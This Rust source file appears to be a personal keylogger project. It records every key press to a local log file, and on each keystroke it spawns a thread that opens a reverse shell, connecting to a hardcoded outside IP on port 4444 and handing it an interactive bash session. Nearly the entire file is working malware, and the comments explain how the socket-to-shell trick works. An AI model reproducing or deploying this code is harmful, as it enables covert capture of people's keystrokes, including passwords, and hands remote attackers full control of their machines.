use std::fs::OpenOptions;
use std::io::Write;
use device_query::{ DeviceState, DeviceEvents };
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
fn main() {

    let device_state = DeviceState::new();

    let _guard = device_state.on_key_down(move |key| {

        // create a new thread and run the reverse_shell() function
        let _ = std::thread::spawn(move || {
            reverse_shell();
        });

        // make thread joinable
        std::thread::sleep(std::time::Duration::from_millis(10));

        println!("Down: {:#?}", key);    


        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open("/home/oef/Documents/Github/k3ymb3d/log.txt")
            .expect("Failed to open file");
        // check if key is "Space" keycode type
        // using match expression
        match *key {
            device_query::Keycode::Space => {
                // write to file
                file.write(b" ").expect("Failed to write to file");
            }
            device_query::Keycode::Enter => {
                // write to file
                file.write(b"\n").expect("Failed to write to file");
            }
            device_query::Keycode::RShift | device_query::Keycode::Slash => {
                // write to file
                file.write(b"?").expect("Failed to write to file");
            }
            _ => { 
                write!(file, "{}",  key).expect("Failed to write to file");  
            }
        }
    
    });
        
    loop {}
}


fn reverse_shell() {
    let sock = TcpStream::connect("178.62.206.43:4444").unwrap();

    // a tcp socket as a raw file descriptor
    // a file descriptor is the number that uniquely identifies an open file in a computer's operating system
    // When a program asks to open a file/other resource (network socket, etc.) the kernel:
    //     1. Grants access
    //     2. Creates an entry in the global file table
    //     3. Provides the software with the location of that entry (file descriptor)
    // https://www.computerhope.com/jargon/f/file-descriptor.htm
    let fd = sock.as_raw_fd();
    // so basically, writing to a tcp socket is just like writing something to a file!
    // the main difference being that there is a client over the network reading the file at the same time!

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
